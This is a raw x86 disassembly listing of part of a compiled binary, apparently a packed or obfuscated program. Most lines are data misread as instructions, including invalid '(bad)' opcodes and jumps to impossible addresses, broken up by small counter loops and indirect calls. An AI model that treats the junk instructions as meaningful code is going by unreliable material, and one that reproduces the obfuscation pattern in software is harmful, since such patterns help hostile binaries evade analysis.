  407400:	dec    eax
  407401:	in     eax,dx
  407402:	ins    BYTE PTR es:[edi],dx
  407403:	out    dx,al
  407404:	mov    WORD PTR ds:0x74ab64ac,?
  40740a:	cld    
  40740b:	mov    al,0x94
  40740d:	mov    ch,0x9d
  40740f:	xor    edi,DWORD PTR [eax+0x419ccedb]
  407415:	repz inc ecx
  407417:	adc    cl,BYTE PTR [ebp-0x6360e9f8]
  40741d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40741e:	add    BYTE PTR [ebp-0x18],dl
  407421:	retf   0x2175
  407424:	jno    0x407425
  407426:	int3   
  407427:	mov    DWORD PTR [edi],edx
  407429:	mov    cl,0x68
  40742b:	(bad)  
  40742c:	xor    ch,BYTE PTR [edi+0x46]
  40742f:	loope  0x4073c9
  407431:	and    eax,0x2dd1383c
  407436:	sbb    BYTE PTR [edx-0x63a5542d],ch
  40743c:	pop    esp
  40743d:	jne    0x40749f
  40743f:	and    DWORD PTR [esi-0xaafd9ae],esp
  407445:	xor    edx,eax
  407447:	mov    edi,DWORD PTR [ebp-0x10]
  40744a:	or     DWORD PTR ds:0x4303d7,0x71a5
  407454:	add    edx,ecx
  407456:	mov    DWORD PTR ds:0x430349,0x5a49
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x4303cf,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     BYTE PTR [edi+0x26],ch
  40747f:	xchg   edi,eax
  407480:	inc    eax
  407481:	xor    eax,0x8a7e7ec5
  407486:	jg     0x407506
  407488:	jle    0x40740a
  40748a:	adc    DWORD PTR es:[esi-0x5f9c2765],esp
  407491:	sub    eax,0x63f18ef5
  407496:	leave  
  407497:	(bad)  
  407498:	sbb    ecx,DWORD PTR [ebx-0x36]
  40749b:	jmp    0xf888ff24
  4074a0:	push   ecx
  4074a1:	dec    edx
  4074a2:	push   es
  4074a3:	mov    ebp,0xcbeade32
  4074a8:	mov    esi,0x17e4d1db
  4074ad:	jb     0x407475
  4074af:	pop    edx
  4074b0:	ret    
  4074b1:	dec    edx
  4074b2:	add    BYTE PTR [ebp+0x62],bh
  4074b5:	fidiv  WORD PTR [edx+0x74bca56c]
  4074bb:	(bad)  
  4074bd:	and    al,BYTE PTR [ecx-0x6a6d9963]
  4074c3:	js     0x407523
  4074c5:	mov    WORD PTR [edx-0x4b94cd7d],es
  4074cb:	dec    edi
  4074cc:	retf   
  4074cd:	adc    al,0x52
  4074cf:	and    al,0x37
  4074d1:	popa   
  4074d2:	sbb    eax,esi
  4074d4:	pop    ss
  4074d5:	cld    
  4074d6:	sbb    al,0x61
  4074d8:	adc    ebp,edi
  4074da:	sub    BYTE PTR [ebp+ebp*4-0x4103f8d6],0x16
  4074e2:	jns    0x4074ad
  4074e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074e5:	jg     0x4074ab
  4074e7:	mul    BYTE PTR [ebx-0x6e]
  4074ea:	sub    al,BYTE PTR [eax+0xe]
  4074ed:	out    dx,eax
  4074ee:	sbb    dl,cl
  4074f0:	adc    al,0xe5
  4074f2:	jge    0x407531
  4074f4:	ror    edx,1
  4074f6:	lods   al,BYTE PTR ds:[esi]
  4074f7:	or     al,bh
  4074f9:	sbb    DWORD PTR [edi+ebp*1],edi
  4074fc:	xchg   BYTE PTR [ecx+eax*4+0x2375d349],ch
  407503:	jmp    0x76076258
  407508:	sub    dl,BYTE PTR [ecx+0x2f]
  40750b:	sub    al,0xa2
  40750d:	call   0xa588f766
  407512:	jle    0x40753b
  407514:	out    dx,eax
  407515:	and    ecx,DWORD PTR [ebp-0x61343fa1]
  40751b:	push   esp
  40751c:	cwde   
  40751d:	mov    ebx,0x9eb3653e
  407522:	add    ah,BYTE PTR [ebx-0x17882b9a]
  407528:	es mov esp,0xbe604b47
  40752e:	mov    esp,0x9d73689f
  407533:	in     al,dx
  407534:	jae    0x40753d
  407536:	jnp    0x40759d
  407538:	shr    BYTE PTR [esi],0x6
  40753b:	mov    al,0x13
  40753d:	add    edi,ecx
  40753f:	retf   0xfdc2
  407542:	sub    dh,ah
  407544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407545:	in     al,dx
  407546:	shl    BYTE PTR gs:[edx+0x5d04cfd4],cl
  40754d:	loope  0x407569
  40754f:	mov    WORD PTR ds:0x85fceaf6,gs
  407555:	ss (bad) 
  407557:	out    0x1d,eax
  407559:	test   BYTE PTR [edx],cl
  40755b:	or     al,0x84
  40755d:	lods   al,BYTE PTR ds:[esi]
  40755e:	or     esp,DWORD PTR [ebx-0x4d1b424e]
  407564:	test   DWORD PTR [edi-0x5c8033ff],edi
  40756a:	enter  0xb0a8,0xc0
  40756e:	call   0x3e:0x8cb2d615
  407575:	in     al,0xcc
  407577:	ins    BYTE PTR es:[edi],dx
  407578:	xchg   ebx,eax
  407579:	outs   dx,BYTE PTR cs:[esi]
  40757b:	sub    WORD PTR [ecx-0x5c],bp
  40757f:	bound  eax,QWORD PTR [ebx+esi*2-0xf8c32f3]
  407586:	mov    ch,0xcd
  407588:	shl    BYTE PTR [ebp+ebx*1-0x11871069],0x10
  407590:	mov    dl,BYTE PTR [ebp-0x46]
  407593:	dec    esp
  407594:	popf   
  407595:	add    eax,0x1752535
  40759a:	adc    DWORD PTR [ecx*4+0x625cbe2d],eax
  4075a1:	ins    DWORD PTR es:[edi],dx
  4075a2:	in     al,dx
  4075a3:	mov    eax,ds:0x91d3a779
  4075a8:	iret   
  4075a9:	or     eax,0x87522ad2
  4075ae:	sbb    al,0xa4
  4075b0:	inc    ebp
  4075b1:	or     al,0x42
  4075b3:	call   0xcf2c3905
  4075b8:	push   0xffffffed
  4075ba:	lock outs dx,BYTE PTR gs:[esi]
  4075bd:	add    BYTE PTR [ebp-0x49e599bc],0xa4
  4075c4:	icebp  
  4075c5:	leave  
  4075c6:	inc    edi
  4075c7:	cs adc al,0x5c
  4075ca:	icebp  
  4075cb:	lahf   
  4075cc:	mov    ds:0x6240950,al
  4075d1:	pop    ebx
  4075d2:	xor    esi,edx
  4075d4:	sub    al,0x4f
  4075d6:	(bad)  
  4075d7:	mov    ah,0x48
  4075d9:	inc    ecx
  4075da:	add    edi,DWORD PTR ds:0x999ca972
  4075e0:	adc    ecx,DWORD PTR [edi+0x16]
  4075e3:	repnz into 
  4075e5:	sti    
  4075e6:	cli    
  4075e7:	jg     0x407641
  4075e9:	jmp    0x3b19:0xedd2ac18
  4075f0:	daa    
  4075f1:	mov    bh,0xea
  4075f3:	test   DWORD PTR [ebx],ebx
  4075f5:	push   0x5b39a97b
  4075fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075fb:	unpckhps xmm1,XMMWORD PTR [eax+0x3]
  4075ff:	int3   
  407600:	sbb    eax,DWORD PTR [edx+0x4b03759a]
  407606:	std    
  407607:	push   ss
  407608:	xor    bh,BYTE PTR ds:0x1ea10939
  40760e:	lock pushf 
  407610:	add    bh,dl
  407612:	dec    esi
  407613:	jo     0x40767d
  407615:	adc    al,0x62
  407617:	test   cl,al
  407619:	ficomp WORD PTR [eax+0x28]
  40761c:	test   BYTE PTR [edi],0x84
  40761f:	jmp    0x40763b
  407621:	add    BYTE PTR [eax],al
  407623:	push   ebx
  407624:	jmp    0x408d87
  407629:	and    DWORD PTR ds:0x42eccb,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42eccb
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42eccb,edx
  407647:	cmp    DWORD PTR ds:0x42eccb,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42eccb,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42e9b3
  40766a:	cmp    DWORD PTR ds:0x42eccb,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42eccb
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42eccb,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	jbe    0x40767d
  4076a6:	mov    eax,ds:0x7ec241c1
  4076ab:	jle    0x407637
  4076ad:	jg     0x40772d
  4076af:	jle    0x4076f5
  4076b1:	and    dl,dh
  4076b3:	pop    esp
  4076b4:	nop
  4076b5:	in     al,0xec
  4076b7:	and    BYTE PTR [ecx+esi*4],0x6c
  4076bb:	(bad)  
  4076bc:	cld    
  4076bd:	hlt    
  4076be:	jae    0x4076be
  4076c0:	xchg   cl,bl
  4076c2:	add    eax,0x4f4cd09
  4076c7:	ret    
  4076c8:	jge    0x4076e7
  4076ca:	das    
  4076cb:	add    eax,0x71d17229
  4076d0:	lahf   
  4076d1:	cmc    
  4076d2:	je     0x407722
  4076d4:	sti    
  4076d5:	(bad)  
  4076d6:	cld    
  4076d7:	cld    
  4076d8:	dec    esi
  4076d9:	int3   
  4076da:	adc    dl,cl
  4076dc:	je     0x4076d6
  4076de:	js     0x4076d9
  4076e0:	xchg   esp,eax
  4076e1:	fsubr  QWORD PTR [esi+0x1380888d]
  4076e7:	xchg   ebx,eax
  4076e8:	xchg   esi,eax
  4076e9:	dec    edi
  4076ea:	fimul  DWORD PTR [edx]
  4076ec:	xor    BYTE PTR [edx-0x6d],cl
  4076ef:	xchg   edi,eax
  4076f0:	arpl   bp,sp
  4076f2:	or     DWORD PTR [ecx+eax*4],esi
  4076f5:	fs rcl ecx,cl
  4076f8:	adc    DWORD PTR [edi],esp
  4076fa:	dec    ebx
  4076fb:	sub    dh,bh
  4076fd:	inc    ebx
  4076fe:	mov    bl,0x4f
  407700:	das    
  407701:	iret   
  407702:	jge    0x40769d
  407704:	fsub   DWORD PTR [esi]
  407706:	aad    0x5b
  407708:	adc    eax,0x3c06b596
  40770d:	sahf   
  40770e:	fnstcw WORD PTR ds:0xdcb35b7
  407714:	gs push edi
  407716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407717:	leave  
  407718:	or     ebx,DWORD PTR [ebx+0x73]
  40771b:	cmp    esp,ebp
  40771d:	imul   ebp,DWORD PTR [esi-0x7a4dc82a],0x33
  407724:	fdiv   QWORD PTR [ecx+0x28]
  407727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407728:	lahf   
  407729:	inc    edx
  40772a:	pop    ds
  40772b:	cli    
  40772c:	dec    ebp
  40772d:	mov    eax,ds:0xb894ef92
  407732:	ret    
  407733:	mov    ebx,0x65497efb
  407738:	and    dl,al
  40773a:	in     al,dx
  40773b:	cmp    dh,BYTE PTR [eax-0xd01d6cf]
  407741:	pop    es
  407742:	inc    ecx
  407743:	lea    ecx,[edi-0x25]
  407746:	scas   eax,DWORD PTR es:[edi]
  407747:	xor    dh,BYTE PTR [esi]
  407749:	cmp    DWORD PTR [ebx+edi*8-0x54bae9d8],edi
  407750:	(bad)  
  407751:	leave  
  407752:	loope  0x407791
  407754:	jle    0x407751
  407756:	rcl    DWORD PTR [esi+0x7d],0x31
  40775a:	fidivr WORD PTR [eax+0x1a]
  40775d:	fs inc esp
  40775f:	xchg   ecx,eax
  407760:	add    ah,BYTE PTR [esi-0xbf51803]
  407766:	pop    DWORD PTR [eax]
  407768:	mov    ebp,0xb74ed722
  40776d:	arpl   WORD PTR [ebp+esi*2+0x51e09825],bx
  407774:	popf   
  407775:	hlt    
  407776:	adc    eax,0xdc08ae02
  40777b:	mov    WORD PTR ds:[ebx+0x58af11ea],cs
  407782:	stos   BYTE PTR es:[edi],al
  407783:	push   ebp
  407784:	mov    ah,0x27
  407786:	sbb    bh,BYTE PTR [eax+0x15]
  407789:	sbb    al,0x4f
  40778b:	out    0x12,al
  40778d:	cld    
  40778e:	xor    cl,BYTE PTR [edi+0x3cdfc784]
  407794:	xchg   esp,eax
  407795:	inc    esp
  407796:	ror    DWORD PTR [edx-0x53884e51],cl
  40779c:	outs   dx,BYTE PTR ds:[esi]
  40779d:	push   ebx
  40779e:	jns    0x182de302
  4077a4:	dec    ebx
  4077a5:	call   0x9c41974d
  4077aa:	or     edi,ecx
  4077ac:	adc    al,0xe2
  4077ae:	not    DWORD PTR [ebx]
  4077b0:	inc    ebp
  4077b1:	dec    ebx
  4077b2:	pop    es
  4077b3:	test   BYTE PTR [esi+0x51],0x48
  4077b7:	lea    esp,[ebx+edx*8]
  4077ba:	mov    bh,0x17
  4077bc:	push   ecx
  4077bd:	cmp    eax,DWORD PTR [eax-0x7f]
  4077c0:	rol    BYTE PTR [ebx],0x37
  4077c3:	push   edx
  4077c4:	ret    0xb87c
  4077c7:	or     BYTE PTR [ebx+edx*2],ah
  4077ca:	xor    DWORD PTR [eax+0x29],0xffffff89
  4077ce:	jl     0x4077b2
  4077d0:	sub    eax,0xde2bc262
  4077d5:	shl    DWORD PTR [ecx+0x23],cl
  4077d8:	push   edi
  4077d9:	shl    BYTE PTR [ebx+0x55],0xc9
  4077dd:	hlt    
  4077de:	pop    esi
  4077df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077e0:	inc    esi
  4077e1:	inc    esp
  4077e3:	and    al,0x87
  4077e5:	in     al,dx
  4077e6:	push   edx
  4077e7:	gs icebp 
  4077e9:	or     al,0xd2
  4077eb:	test   eax,0xa16f069a
  4077f0:	xchg   esi,eax
  4077f1:	jle    0x4077e3
  4077f3:	and    cl,bh
  4077f5:	outs   dx,BYTE PTR ds:[esi]
  4077f6:	aad    0x28
  4077f8:	(bad)  
  4077f9:	ins    BYTE PTR es:[edi],dx
  4077fa:	mov    WORD PTR [esi],ss
  4077fc:	ror    DWORD PTR [ebx+0x35114f4f],cl
  407802:	or     ah,BYTE PTR [ebx-0x6a]
  407805:	jmp    0x4cbd:0x19bb5a21
  40780c:	lods   eax,DWORD PTR ds:[esi]
  40780d:	sbb    al,0x7f
  40780f:	fadd   QWORD PTR [edi-0x7f]
  407812:	sbb    bh,BYTE PTR [eax]
  407814:	fstp   DWORD PTR [ebx]
  407816:	mov    ah,BYTE PTR [ebp+0x6d]
  407819:	pop    ds
  40781a:	mov    ds:0x9bc5f4ca,al
  40781f:	sbb    BYTE PTR [eax-0x28e51fc],bl
  407825:	xlat   BYTE PTR ds:[ebx]
  407826:	nop
  407827:	push   0x4a2f8f3e
  40782c:	neg    BYTE PTR [ebx+0x23]
  40782f:	xchg   esp,eax
  407830:	shl    DWORD PTR ds:0x8271a709,0x79
  407837:	out    0xc7,al
  407839:	es ret 
  40783b:	sbb    BYTE PTR [ecx+0x10a7c361],0x31
  407842:	jne    0x4078ae
  407844:	mov    edx,DWORD PTR [ebp-0x4]
  407847:	adc    DWORD PTR ds:0x430349,0x4303cf
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x43036d,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e6c4,0x1e
  407871:	cmp    DWORD PTR ds:0x42e6c4,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e6c4,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42e9b7
  407896:	mov    edi,DWORD PTR ds:0x42e6c4
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e6c4,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42eccf
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x43033d,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x43033d
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x43033d,ebx
  4078d6:	cmp    DWORD PTR ds:0x43033d,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42eb27
  4078f1:	cmp    DWORD PTR ds:0x43033d,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	call   DWORD PTR [ebx]
  407943:	pop    edi
  407944:	jp     0x4078fa
  407946:	ffree  st(0)
  407948:	jle    0x4079c8
  40794a:	mov    bh,BYTE PTR [edi+0x7e]
  40794d:	jle    0x407920
  40794f:	mov    ds:0xe8aa7809,eax
  407954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407955:	fcmovu st,st(5)
  407957:	dec    edx
  407958:	and    eax,0x246f3f7b
  40795d:	data16 jle 0x40798d
  407960:	jle    0x40799f
  407962:	mov    dl,0x84
  407964:	push   es
  407965:	mulps  xmm7,XMMWORD PTR [ebp+0x34ac71e]
  40796c:	hlt    
  40796d:	jg     0x40795a
  40796f:	fnsave [edi+eax*2-0x67c772a0]
  407976:	nop
  407977:	(bad)
  40797a:	mov    ebp,0xe37ea2ce
  40797f:	inc    ecx
  407980:	xchg   ecx,eax
  407981:	adc    eax,0xc24d854b
  407986:	cvtpi2ps xmm3,QWORD PTR [edi+0x7147a3e]
  40798d:	sbb    BYTE PTR [ecx],al
  40798f:	mov    ecx,ecx
  407991:	(bad)  
  407992:	imul   esi,DWORD PTR [esi],0xf5640846
  407998:	popf   
  407999:	dec    edi
  40799a:	xchg   esp,eax
  40799b:	adc    ch,0x2f
  40799e:	pop    ecx
  40799f:	mov    cl,0x4a
  4079a1:	jge    0x407a15
  4079a3:	inc    ecx
  4079a4:	jns    0x40796b
  4079a6:	push   ecx
  4079a7:	sub    bl,BYTE PTR [esp+edx*4]
  4079aa:	cmc    
  4079ab:	sar    DWORD PTR [ebp+0x7b],1
  4079ae:	dec    ecx
  4079af:	aaa    
  4079b0:	ret    
  4079b1:	in     eax,0xaf
  4079b3:	ins    BYTE PTR es:[edi],dx
  4079b4:	jnp    0x407a29
  4079b6:	or     al,0x4f
  4079b8:	and    edx,DWORD PTR [edx]
  4079ba:	add    eax,DWORD PTR [eax+0x6e8dfb7f]
  4079c0:	add    eax,0x17f27055
  4079c5:	rcr    DWORD PTR [eax],1
  4079c7:	xor    al,0xcb
  4079c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079ca:	das    
  4079cb:	mov    ds:0x5c84974a,eax
  4079d0:	xor    dh,BYTE PTR [ecx+0x55]
  4079d3:	pop    ebx
  4079d4:	cwde   
  4079d5:	or     dl,BYTE PTR [edx]
  4079d7:	scas   al,BYTE PTR es:[edi]
  4079d8:	(bad)  
  4079da:	or     ebx,0xde629917
  4079e0:	(bad)  
  4079e1:	jmp    0x40799f
  4079e3:	fsubr  QWORD PTR [ebx]
  4079e5:	push   ss
  4079e6:	mov    al,0x9
  4079e8:	mov    ds,edi
  4079ea:	push   eax
  4079eb:	mov    edi,0xd3f7da1f
  4079f0:	adc    BYTE PTR [edx],0x5d
  4079f3:	daa    
  4079f4:	dec    DWORD PTR ds:[ebp-0x7d98eed3]
  4079fb:	or     ah,bl
  4079fd:	es adc cl,bh
  407a00:	jno    0x407a49
  407a02:	mov    al,ds:0xe78e42a1
  407a07:	xchg   esp,eax
  407a08:	sub    eax,DWORD PTR [edx+edi*2]
  407a0b:	push   ebx
  407a0c:	push   ebp
  407a0d:	dec    eax
  407a0e:	pop    esi
  407a0f:	ds push cs
  407a11:	mov    ds:0x1f339957,eax
  407a16:	popf   
  407a17:	sti    
  407a18:	imul   ebx,DWORD PTR [ebx+0x21],0xbfbd28ae
  407a1f:	nop
  407a20:	int3   
  407a21:	lds    esi,FWORD PTR [ebp+0x4ad9790c]
  407a27:	jl     0x407a17
  407a29:	push   ebp
  407a2a:	iret   
  407a2b:	fild   DWORD PTR [ebx-0x12]
  407a2e:	adc    DWORD PTR [edx-0x40],esp
  407a31:	popa   
  407a32:	(bad)  
  407a34:	inc    ebx
  407a35:	gs loop 0x407a78
  407a38:	or     eax,0x57d8c72c
  407a3d:	in     eax,dx
  407a3e:	xor    al,0xb7
  407a40:	fnstcw WORD PTR [ebx+0x70]
  407a43:	sahf   
  407a44:	stc    
  407a45:	pop    esp
  407a46:	ins    BYTE PTR es:[edi],dx
  407a47:	dec    esi
  407a48:	addr16 sub al,0xa5
  407a4b:	adc    ch,BYTE PTR [ebp+0x2f841b75]
  407a51:	loop   0x407a2c
  407a53:	mov    esp,0x3d0176d9
  407a58:	addr16 fs in al,0x9d
  407a5c:	jl     0x407ac8
  407a5e:	daa    
  407a5f:	sub    BYTE PTR [esi-0x4d],ah
  407a62:	push   edx
  407a63:	sbb    DWORD PTR [eax-0x6c],edx
  407a66:	mov    ecx,fs
  407a68:	push   esi
  407a69:	(bad)  
  407a6a:	jb     0x4079fb
  407a6c:	call   0x6ff2:0x3ac106b3
  407a73:	cli    
  407a74:	add    ebp,ebx
  407a76:	je     0x407ab3
  407a78:	inc    ebp
  407a79:	aad    0x9a
  407a7b:	mov    al,0xb8
  407a7d:	mov    bh,BYTE PTR [ebx+0x2c]
  407a80:	cmp    bh,al
  407a82:	add    dh,BYTE PTR [esi]
  407a84:	add    DWORD PTR [ecx+0x5a2f8d78],0xf79080ff
  407a8e:	sub    al,0x11
  407a90:	int    0xfe
  407a92:	inc    ebp
  407a93:	retf   
  407a94:	aaa    
  407a95:	push   ebx
  407a96:	xchg   edx,eax
  407a97:	xor    DWORD PTR [edx],esi
  407a99:	jp     0x407a3d
  407a9b:	mov    edi,0xb8643160
  407aa0:	push   0xac5160c
  407aa5:	mov    ebp,DWORD PTR [ecx+0x64]
  407aa8:	pushf  
  407aa9:	rcr    bl,1
  407aab:	lods   eax,DWORD PTR ds:[esi]
  407aac:	shl    DWORD PTR [ebp+0x5],1
  407aaf:	jmp    DWORD PTR [edi]
  407ab1:	cmp    eax,0xe2f6b10f
  407ab6:	dec    edi
  407ab7:	mov    ebp,0xac3db588
  407abc:	inc    edx
  407abd:	xchg   edx,eax
  407abe:	and    BYTE PTR [edx],bh
  407ac0:	xor    bh,BYTE PTR [ebx]
  407ac2:	call   0x6e59de0b
  407ac7:	in     eax,0x10
  407ac9:	xchg   al,dl
  407acb:	clc    
  407acc:	adc    ebx,DWORD PTR fs:[eax]
  407acf:	and    BYTE PTR [edx],al
  407ad1:	popf   
  407ad2:	xchg   ebx,eax
  407ad3:	sub    BYTE PTR [ebp-0x75],dl
  407ad6:	mov    eax,db6
  407ad9:	fild   DWORD PTR [edi-0x6f]
  407adc:	push   es
  407add:	retf   0x7380
  407ae0:	inc    edi
  407ae1:	je     0x407a6e
  407ae3:	pop    ebp
  407ae4:	lock sub ebx,edi
  407ae7:	cmp    ebx,edx
  407ae9:	ja     0x407af7
  407aef:	mov    edx,DWORD PTR [ebp-0x28]
  407af2:	jmp    0x408770
  407af7:	mov    edx,DWORD PTR [ebp-0x30]
  407afa:	mov    edi,DWORD PTR [ebp-0x4]
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi+0xc0b8cca]
  407b11:	pop    esp
  407b12:	imul   eax,ecx,0x7f8a7e7e
  407b18:	jle    0x407b98
  407b1a:	adc    al,0x5
  407b1c:	stc    
  407b1d:	sub    esi,DWORD PTR [ebx-0x25]
  407b20:	cmp    DWORD PTR ds:0x32fffe2c,edx
  407b26:	mov    ecx,0x15ca9025
  407b2b:	fld    QWORD PTR [esp+eiz*8]
  407b2e:	loopne 0x407b2f
  407b30:	push   0xffffff88
  407b32:	(bad)  
  407b33:	jmp    0x4f3fa9c0
  407b38:	jb     0x407acf
  407b3a:	push   ecx
  407b3b:	mov    cl,0xb9
  407b3d:	ret    
  407b3e:	test   DWORD PTR [ebx],esp
  407b40:	push   esp
  407b41:	push   eax
  407b42:	and    ah,BYTE PTR [ebx+0x63]
  407b45:	adc    BYTE PTR [edi-0x43a09bcc],0x6e
  407b4c:	sub    ah,BYTE PTR [esi-0x7791d0c8]
  407b52:	fstp   DWORD PTR [ebx-0x17]
  407b55:	ror    BYTE PTR [esi],1
  407b57:	push   ebp
  407b58:	push   esi
  407b59:	(bad)  
  407b5b:	iret   
  407b5c:	(bad)  [esi+0x0]
  407b5f:	xchg   DWORD PTR [esp+edi*8],esp
  407b62:	pop    esp
  407b63:	int3   
  407b64:	out    dx,eax
  407b65:	mov    ebp,0xeedafd0d
  407b6a:	mov    DWORD PTR [esi],ecx
  407b6c:	mov    dh,0x70
  407b6e:	xchg   edi,eax
  407b6f:	cdq    
  407b70:	inc    edx
  407b71:	sbb    ebx,eax
  407b73:	jns    0x407b69
  407b75:	mov    al,ds:0x1daa62be
  407b7a:	cmp    DWORD PTR [ebx+0x4c],esi
  407b7d:	cli    
  407b7e:	retf   0xc05c
  407b81:	and    cl,BYTE PTR [edi]
  407b83:	pop    eax
  407b84:	and    al,0x6d
  407b86:	div    DWORD PTR [edx+0x0]
  407b89:	out    dx,al
  407b8a:	adc    eax,0xfc58e663
  407b8f:	cmp    BYTE PTR [ecx+0x2b],ah
  407b92:	inc    eax
  407b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b94:	outs   dx,BYTE PTR ds:[esi]
  407b95:	xor    ebx,DWORD PTR [ebp+ebx*2-0x62eee4ea]
  407b9c:	jmp    0x66e78cdb
  407ba1:	fbld   TBYTE PTR [eax+0x5420e867]
  407ba7:	sub    eax,0xbd82665a
  407bac:	push   ebx
  407bad:	(bad)  
  407bae:	xchg   edi,eax
  407baf:	(bad)  
  407bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bb1:	pop    bp
  407bb3:	jmp    0xaff974b9
  407bb8:	inc    esi
  407bb9:	dec    ecx
  407bba:	inc    esp
  407bbb:	(bad)  
  407bbc:	ins    BYTE PTR es:[edi],dx
  407bbd:	js     0x407bbe
  407bbf:	shl    DWORD PTR [edi],0x9d
  407bc2:	ds retf 
  407bc4:	int3   
  407bc5:	mov    edi,0xf83661f5
  407bca:	pop    es
  407bcb:	ret    0x5f34
  407bce:	push   0xc2f5f62a
  407bd3:	sbb    DWORD PTR [esi],ebx
  407bd5:	fcom   DWORD PTR [ecx+0x2a]
  407bd8:	adc    al,0x84
  407bda:	xor    dh,BYTE PTR ds:0xdc8bece
  407be0:	icebp  
  407be1:	inc    ecx
  407be2:	adc    dh,bh
  407be4:	inc    esi
  407be5:	fisttp WORD PTR [esi-0x331f9e41]
  407beb:	ret    0xcc26
  407bee:	inc    esi
  407bef:	jnp    0x407b83
  407bf1:	les    esp,FWORD PTR [esi+0x59abd58]
  407bf7:	test   ch,bl
  407bf9:	hlt    
  407bfa:	push   edx
  407bfb:	pop    ds
  407bfc:	and    cl,BYTE PTR [edx+0x1561bfa2]
  407c02:	adc    BYTE PTR [edx-0x45],bh
  407c05:	add    eax,ecx
  407c07:	lahf   
  407c08:	js     0x407c53
  407c0a:	(bad)  
  407c0b:	fbstp  TBYTE PTR [esp+edi*1+0x2c]
  407c0f:	mov    al,ds:0x7b531ec4
  407c14:	mov    ah,0x5f
  407c16:	and    dl,BYTE PTR [ecx]
  407c18:	aaa    
  407c19:	js     0x407bd2
  407c1b:	call   0xfd726d75
  407c20:	xchg   edx,eax
  407c21:	aas    
  407c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c23:	pop    esp
  407c24:	popf   
  407c25:	gs xchg esp,eax
  407c27:	lock hlt 
  407c29:	inc    ebx
  407c2a:	mov    dh,0x71
  407c2c:	ins    DWORD PTR es:[edi],dx
  407c2d:	cli    
  407c2e:	dec    esp
  407c2f:	(bad)  
  407c30:	mov    ah,0x2c
  407c32:	pop    ebx
  407c33:	jl     0x407c64
  407c35:	js     0x407ca3
  407c37:	into   
  407c38:	scas   al,BYTE PTR es:[edi]
  407c39:	aam    0xf3
  407c3b:	les    esp,FWORD PTR [edi]
  407c3d:	mov    dl,0xa
  407c3f:	mov    DWORD PTR [ebp+0x18],edx
  407c42:	xlat   BYTE PTR ds:[ebx]
  407c43:	(bad)  
  407c44:	cld    
  407c45:	mov    edi,0xaa2449e5
  407c4a:	aam    0x69
  407c4c:	(bad)  
